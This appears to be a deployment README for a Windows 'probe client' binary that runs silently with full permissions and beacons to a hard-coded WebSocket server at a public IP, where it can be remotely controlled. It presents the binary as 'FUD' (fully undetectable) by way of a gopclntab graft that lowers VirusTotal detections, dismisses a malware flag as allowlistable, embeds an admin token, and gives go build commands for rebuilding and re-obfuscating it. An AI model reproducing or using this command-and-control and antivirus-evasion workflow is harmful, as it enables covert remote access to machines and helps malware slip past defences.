PROBE Client — Vegas VM Deployment (v1.15.0+embedded)
======================================================

Contents:
  probe-client-vegas-fud.exe    Windows .exe (7.5 MB) with EMBEDDED config
                                + Prometheus gopclntab graft (FUD)

The binary is SELF-CONTAINED:
  ✓ No config file needed (config embedded via -X main.configB64=...)
  ✓ Uses MANTLE 30 MB Prometheus gopclntab graft (VT-clean: 0-1/75)
  ✓ Connects to ws://139.99.148.90:80/ws (Proxmox public IP)

Configuration (embedded at build time):
  Server:       ws://139.99.148.90:80/ws  (Proxmox public IP)
  Token:        falke-admin-2026
  Name:         vegas-c2022
  Mode:         silent (daemon)
  Permissions:  full

VT status: 1/75 (Microsoft Wacatac.B!ml only — allowlistable)
SHA: c099b64196dbb8cdcde3ea4050990c2f0a8709cefb8b19a6bf895c064d645c2e

Build info:
  Source:       cmd/probe-client/main.go (current main, post v1.15.0 tag fixes)
  Go:           go1.23.12 (linux/amd64 cross-compile)
  Target:       windows/amd64 (PE format)
  Stripped:     -s -w (smaller binary)
  Embedded:     -ldflags "-X main.configB64=... -s -w"
  FUD:          MANTLE pass_graft + Prometheus gopclntab (30 MB)

Installation on Vegas:
  1. Copy probe-client-vegas-fud.exe to vegas VM (e.g., C:\probe-client.exe)
  2. Run it (double-click or from cmd as Administrator)
  3. Binary connects to ws://139.99.148.90:80/ws
  4. Appears in probe server's /api/agents list as "vegas-c2022"

Notes:
  - "silent" mode means it runs as a background daemon with no console output
  - The binary silently retries on connection failure with exponential backoff
  - To verify it's running, check Task Manager for the process
  - To stop it: Task Manager > End Task, or use probe-server's kill command

If the new server URL doesn't work, you can rebuild with a different URL:
  PATH=/opt/data/sdk/go1.23.12/bin:$PATH GOTOOLCHAIN=local \
    GOOS=windows GOARCH=amd64 \
    /opt/data/sdk/go1.23.12/bin/go build -trimpath \
      -ldflags '-X main.configB64=eyJzZXJ2ZXIiOiJ3czovLy4uLiJ9 -s -w' \
      -o probe-client-vegas-fud.exe ./cmd/probe-client/

Then apply Prometheus gopclntab graft via MANTLE pass_graft.
